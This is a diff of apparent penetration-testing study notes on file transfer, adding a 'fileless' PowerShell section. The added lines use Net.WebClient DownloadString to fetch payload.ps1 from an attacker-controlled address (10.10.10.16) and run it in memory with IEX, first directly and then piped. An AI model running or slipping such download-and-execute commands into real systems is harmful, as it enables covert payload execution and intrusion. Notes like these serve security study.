@@ -51,9 +51,15 @@ while ($client.IsBusy) { Start-Sleep -Seconds 1 }
 # File is now ready to use   
 ```
 
-- [ ] POWERHSLL DOWNLOADSTRING- FILELESS METHOD
+- [x] POWERHSLL DOWNLOADSTRING- FILELESS METHOD
 THE `Invoke-Expression` or `IEX` cmdlet lets you run scripts directly in memory 
 ```powershell
 $client= New-Object Net.WebClient
-$client.DownloadString(") 
+IEX $client.DownloadString("http://10.10.10.16/payload.ps1") 
 ```
+Or just pipe it 
+```powershell
+$client.DownloadString("10.10.10.16/paYLOAD.ps1") | IEX  
+```
+
+- [ ] SMB DOWNLOADS
